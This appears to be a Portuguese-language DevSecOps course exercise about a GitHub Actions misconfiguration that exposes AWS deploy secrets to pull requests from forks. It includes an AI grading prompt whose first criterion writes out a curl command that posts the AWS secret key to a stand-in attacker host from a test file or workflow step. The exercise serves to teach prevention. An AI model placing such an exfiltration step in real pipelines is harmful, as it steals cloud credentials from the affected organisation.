# Exercício 04 — O Roubo no Pipeline

## Tarefa

Um engenheiro sênior no Github ativou uma regra perigosa: "Qualquer Pull Request de contribuidor anônimo externo rodam os Testes Automáticos do Github Actions utilizando as Chaves Múltiplas do Repositório (Incluindo as chaves do Deploy AWS)". Descreva, passo a passo, o script ardiloso que um adolescente injetaria num PR para enviar as chaves da AWS da sua empresa direto para o servidor do hacker, roubando a nuvem toda sem sequer o PR ser "aprovado/mergeado".

## Corrija Sua Atividade Com IA

```text
Cenário: Ameaça Interna CI/CD, Pwned Actions Environment Secrets.

Tarefa: Minha narrativa do ataque no Pipeline que o Devsecops precisa prevenir:
[COLE SUA RESPOSTA AQUI]

Critérios de correção:
1. Demonstrei que o hacker altera o arquivo de testes `jest` ou o arquivo `.yml` inserindo um mero `curl -X POST hacker.com/log -d "$SECRET_AWS_KEY"` no meio dos steps de Build?
2. Justifiquei o imperativo do Github de exigir que PRs de Fora NUNCA consumam chaves Privilegiadas (Approval Checks for PRs from Fork)?
```
